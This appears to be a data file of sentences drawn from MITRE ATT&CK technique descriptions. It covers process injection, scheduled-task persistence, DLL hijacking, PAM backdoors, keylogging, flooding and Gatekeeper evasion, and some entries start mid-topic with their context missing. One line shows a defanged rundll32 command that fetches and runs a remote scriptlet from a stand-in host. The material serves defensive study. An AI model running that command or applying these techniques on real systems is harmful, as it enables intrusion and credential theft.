    "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges.",
    "EWM injection is a method of executing arbitrary code in the address space of a separate live process.",
    "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).",
    "Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.",
    "This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.",
    "  ",
    "Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure.",
    "Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.",
    "Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.",
    "Writing payloads to shared sections also avoids the use of highly monitored API calls such as \"WriteProcessMemory\" and \"CreateRemoteThread\".",
    "More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.",
    "  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",
    "Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
    "There are multiple ways to access the Task Scheduler in Windows.",
    "The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.",
    "In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.",
    "The deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though \"at.exe\" can not access tasks created with \"schtasks\" or the Control Panel.",
    "An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence.",
    "The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).",
    "Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.",
    "Adversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks.",
    "Specifically, an adversary may hide a task from \"schtasks /query\" and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).",
    "Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., \"Index\" value) within associated registry keys.",
    "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control.",
    "With elevated permissions, adversaries can use features such as the \"libpcap\" library to open sockets and install filters to allow or disallow certain types of data to come through the socket.",
    "The filter may apply to all traffic passing through the specified network interface (or every interface if not specified).",
    "When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.",
    "To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.",
    "Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells.",
    "Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).",
    "Filters can be installed on any Unix-like platform with \"libpcap\" installed or on Windows hosts using \"Winpcap\".",
    "Adversaries may use either \"libpcap\" with \"pcap_setfilter\" or the standard library function \"setsockopt\" with \"SO_ATTACH_FILTER\" options.",
    "Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration.",
    "Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.",
    "Adversaries may abuse various utilities to compress or encrypt data before exfiltration.",
    "Some third party utilities may be preinstalled, such as \"tar\" on Linux and macOS or \"zip\" on Windows systems.",
    "On Windows, \"diantz\" or \" makecab\" may be used to package collected files into a cabinet (.cab) file.",
    "\"diantz\" may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).",
    "\"xcopy\" on Windows can copy files and directories with a variety of options.",
    "Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration.",
    "Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",
    "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).",
    "VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.",
    "VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software.",
    "By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.",
    "Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands.",
    "An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network.",
    "Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",
    "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads.",
    "WMI is an administration feature that provides a uniform environment to access Windows system components.",
    "The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).",
    "Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.",
    "An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.",
    " ",
    "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.",
    "Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.",
    "Taking a screenshot is also typically possible through native utilities or API calls, such as \"CopyFromScreen\", \"xwd\", or \"screencapture\".",
    "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses.",
    "Fileless storage can be broadly defined as any format other than a file.",
    "Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.",
    "Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.",
    "Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)).",
    "Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.",
    "Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., \"%SystemRoot%\\System32\\Wbem\\Repository\") or Registry (e.g., \"%SystemRoot%\\System32\\Config\") physical files.",
    "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.",
    "Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.",
    "These scripts can vary based on operating system and whether applied locally or remotely.",
    " ",
    "Adversaries may use these scripts to maintain persistence on a single system.",
    "Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).",
    "By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.",
    "For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.",
    "Adversaries may also manipulate DNS and use their position in order to intercept user credentials and session cookies.",
    "[Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.",
    "Adversaries may also use the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).",
    "Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
    "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system.",
    "They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).",
    "The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.",
    "Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Various utilities and commands may acquire this information, including \"whoami\".",
    "In macOS and Linux, the currently logged in user can be identified with \"w\" and \"who\".",
    "On macOS the \"dscl . list /Users | grep -v '_'\" command can also be used to enumerate user accounts.",
    "Environment variables, such as \"%USERNAME%\" and \"$USER\", may also be used to access this information.",
    "On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as \"show users\" and \"show ssh\" can be used to display users currently logged into the device.",
    "Adversaries may buy, lease, or rent infrastructure that can be used during targeting.",
    "A wide variety of infrastructure exists for hosting and orchestrating adversary operations.",
    "Infrastructure solutions include physical or cloud servers, domains, and third-party web services.",
    "Additionally, botnets are available for rent or purchase.",
    "Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations.",
    "Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090).",
    "Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
    "Adversaries may abuse rundll32.exe to proxy execution of malicious code.",
    "Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations.",
    "Rundll32.exe is commonly associated with executing DLL payloads (ex: \"rundll32.exe {DLLname, DLLfunction}\").",
    "Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions \"Control_RunDLL\" and \"Control_RunDLLAsUser\".",
    "Double-clicking a .cpl file also causes rundll32.exe to execute.",
    " ",
    "Rundll32 can also be used to execute scripts such as JavaScript.",
    "This can be done using a syntax similar to this: \"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"\"",
    "This behavior has been seen used by malware such as Poweliks.",
    " ",
    "Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names.",
    "As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command \"rundll32.exe ExampleDLL.dll, ExampleFunction\", rundll32.exe would first attempt to execute \"ExampleFunctionW\", or failing that \"ExampleFunctionA\", before loading \"ExampleFunction\").",
    "Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending \"W\" and/or \"A\" to harmless ones.",
    "DLL functions can also be exported and executed by an ordinal number (ex: \"rundll32.exe file.dll,#1\").",
    "Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
    "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
    "Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.",
    "These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.",
    "In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing.",
    "The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
    "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting.",
    "By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.",
    "Once acquired, the serverless runtime environment can be used to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.",
    "As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",
    "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.",
    "Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications.",
    "Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.",
    "Some data encoding systems may also result in data compression, such as gzip.",
    "Adversaries may embed payloads within other files to conceal malicious content from defenses.",
    "Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content.",
    "In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.",
    "Adversaries may embed payloads in various file formats to hide payloads.",
    "This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.",
    "For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.",
    "Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.",
    "Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.",
    "These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module.",
    "For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.",
    "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts.",
    "PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services.",
    "The most common authentication module is \"pam_unix.so\", which retrieves, sets, and verifies account authentication information in \"/etc/passwd\" and \"/etc/shadow\".",
    "Adversaries may modify components of the PAM system to create backdoors.",
    "PAM components, such as \"pam_unix.so\", can be patched to accept arbitrary adversary supplied values as legitimate credentials.",
    "Malicious modifications to the PAM system may also be abused to steal credentials.",
    "Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.",
    "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence.",
    "In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.",
    "Another variation of this technique is to utilize temporary storage attached to the compute instance.",
    "Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",
    "Adversaries may gather information about the victim's hosts that can be used during targeting.",
    "Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).",
    "Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).",
    "Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.",
    "Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).",

    "Adversaries may search public digital certificate data for information about victims that can be used during targeting.",
    "Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content.",
    "These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.",
    "Adversaries may search digital certificate data to gather actionable information.",
    "Threat actors can use online resources and lookup tools to harvest information about certificates.",
    "Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).",
    "Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "Adversaries may log user keystrokes to intercept credentials as the user types them.",
    "Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.",
    "Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.",
    "Some methods include: * Hooking API callbacks used for processing keystrokes.",
    "Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.",
    "* Reading raw keystroke data from the hardware buffer.",
    "* Windows Registry modifications.",
    "* Custom drivers.",
    "* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
    "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.",
    "File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions.",
    "File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).",
    "Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group.",
    "While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: \"chown\" (short for change owner), and \"chmod\" (short for change mode).",
    "Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it.",
    "They could subsequently lock others out of the file.",
    "Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",

    "Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.",
    "Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.",
    " Typically, management services over commonly used ports are used when guessing passwords.",
    "Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) * SNMP (161/UDP and 162/TCP/UDP)",
    "In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365..",
    "Further, adversaries may abuse network device interfaces (such as \"wlanAPI\") to brute force accessible wifi-router(s) via wireless authentication protocols.",
    "In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",

    "Large botnets can generate a significant amount of traffic from systems spread across the global Internet.",
    "Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack.",
    "In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network.",
    "In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult.",
    "Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",
    "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries.",

    "Malicious rules commonly filter out emails based on key words (such as \"malware\", \"suspicious\", \"phish\", and \"hack\") found in message bodies and subject lines.",
    " In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes.",
    "For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.",

    "Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.",
    "With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed.",
    "Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.",
    "ACK floods use the stateful nature of the TCP protocol.",
    "A flood of ACK packets are sent to the target.",
    "This forces the OS to search its state table for a related TCP connection that has already been established.",
    "Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists.",
    "When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets.",

    "Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system.",
    "The \"sudo\" command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"",
    "Since sudo was made for the system administrator, it has some useful configuration features such as a \"timestamp_timeout\", which is the amount of time in minutes between instances of \"sudo\" before it will re-prompt for a password.",

    "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant.",
    "For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.",
    "With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).",

    "Spearphishing attachment is a specific variant of spearphishing.",
    "Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email.",
    "All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry.",
    "In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.",
    "Spearphishing may also involve social engineering techniques, such as posing as a trusted source.",
    "There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files.",
    "Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system.",
    "The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so.",
    "The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses.",
    "Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information.",
    "Scripts and executables may contain variables names and other strings that help developers document code functionality.",
    "Symbols are often created by an operating system\u2019s \"linker\" when executable payloads are compiled.",

    "Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
    "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs.",
    "Windows systems use a common method to look for required DLLs to load into a program.",
    " Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.",
    "There are many ways an adversary can hijack DLL loads.",
    "Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program.",
    "Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL.",
    "Often this location is the current working directory of the program.",
    "Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.",
    " Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.",
    "If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level.",
    "In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.",
    "Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "Once established within a system or network, an adversary may use automated techniques for collecting internal data.",
    "Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.",
    "In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.",
    "This functionality could also be built into remote access tools.",
    "This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
    "Adversaries may collect data stored in the clipboard from users copying information within or between applications.",
    "For example, on Windows adversaries can access clipboard data by using \"clip.exe\" or \"Get-Clipboard\".",

    "macOS and Linux also have commands, such as \"pbpaste\", to grab clipboard contents.",
    "Adversaries may gather credentials from the proc filesystem or \"/proc\".",
    "The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory.",
    "For each process, the \"/proc/<PID>/maps\" file shows how memory is mapped within the process\u2019s virtual address space.",
    "And \"/proc/<PID>/mem\", exposed for debugging purposes, provides access to the process\u2019s virtual address space.",
    "When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns that are indicative of credentials, such as looking for fixed strings in memory structures or cached hashes.",
    "When running without privileged access, processes can still view their own virtual memory locations.",
    "Some services or programs may save credentials in clear text inside the process\u2019s memory.",
    "If running as or with the permissions of a web browser, a process can search the \"/maps\" & \"/mem\" locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
    "Adversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting.",
    "A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.",

    "Adversaries may acquire user credentials from third-party password managers.",
    "Password managers are applications designed to store user credentials, normally in an encrypted database.",
    "Credentials are typically accessible after a user provides a master password that unlocks the database.",

    "Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host.",
    "Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more.",
    "Gatekeeper also treats applications running for the first time differently than reopened applications.",
    "Based on an opt-in system, when files are downloaded an extended attribute (xattr) called \"com.apple.quarantine\" (also known as a quarantine flag) can be set on the file by the application performing the download.",
    "Launch Services opens the application in a suspended state.",
    "For first run applications with the quarantine flag set, Gatekeeper executes the following functions:",
    "1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.",
    "2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.",
    "3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.",
    "4. Notarization - Using the \"api.apple-cloudkit.com\" API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked.",
    "Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.",
    "Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries.",
    "For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.",
    "Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag.",
    "Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
    "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing.",
    "Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",
    "In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001).",

    "In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.",
    "Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest.",
    "This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.",
    "Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",

    "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.",
    "An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.",
    "Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol.",
    "Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.",

    "In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines.",
